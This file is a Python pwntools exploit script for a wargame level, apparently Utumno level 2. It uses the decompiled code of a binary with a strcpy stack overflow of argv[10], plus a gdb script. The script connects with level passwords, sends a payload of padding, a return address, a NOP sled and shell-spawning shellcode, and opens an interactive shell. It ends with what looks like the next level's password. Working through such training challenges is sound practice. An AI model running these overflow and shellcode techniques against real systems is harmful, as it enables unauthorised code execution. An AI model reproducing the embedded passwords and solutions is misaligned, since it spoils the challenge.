from lib.exploit import *

'''
int main(int argc,char **argv)

{
  char buffer [12];
  
  if (argc != 0) {
    puts("Aw..");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  strcpy(buffer,argv[10]);
  return 0;
}
'''


gdb_script = '''
set disassembly-flavor intel   
set follow-fork-mode child
alias gil = disassemble
unset env
show env

# break at main in wrapper script
b *main
r /utumno/utumno2 `cat /tmp/gil2/payload`

b *execve
c
si
si
del
break *main
c
# now in main in target prog




# argc check
b *0x08048451
# before strcpy
b *0x08048478

c

'''

LEVEL = "2"

def prepare_dir(s,dir,payload):
    global gdb_script
    log.info("%s " % s.process(["rm", "-rf", dir]).recvall())
    log.info("%s " % s.process(["mkdir", "-p", dir]).recvall())
    upload(s, gdb_script, dir + "gdb.script")
    upload(s, payload, dir + "payload")
    return dir

# s = connect_to_local("1", "aathaeyiew", remote=False)
s = connect(LEVEL, "ceewaceiph")
from lib.exploit import *

padding = cyclic(32, alphabet=string.ascii_uppercase)
# found via gdb
# 41414145 AAAE
padding = "AAAABAAACAAADAAA"
len_padding = len(padding)
log.info(f"len_padding: {len_padding}")

argv_10_adr = 0xffffdf75


log.info(f"alpha: {padding}")


dir = "/tmp/gil"+LEVEL+"/"

payload = b""
payload += bytes(padding, "utf-8")
payload += pack(argv_10_adr + len_padding + 4 + 25, 32)  # nop_adr = &env[10] + len_padding + 4 (adr itself) + 25 (half of nopslide)
payload += b"\x90"*50
payload += asm(shellcraft.i386.linux.sh())


prepare_dir(s, dir, payload)

remote_wrapper = dir+"wrapper"
wrapper_src = read("./2/wrapper.cpp")
upload(s, wrapper_src, dir+"wrapper.cpp")
log.info("%s " % s.process(["gcc", "-m32", "-no-pie", "wrapper.cpp", "-o", "wrapper"], cwd=dir).recvall())
log.info("%s " % s.process(["chmod", "a+x", remote_wrapper], cwd=dir).recvall())


io = s.process(["env", "-i", remote_wrapper, BINARY_PATH, payload])
io.interactive()

# zuudafiine





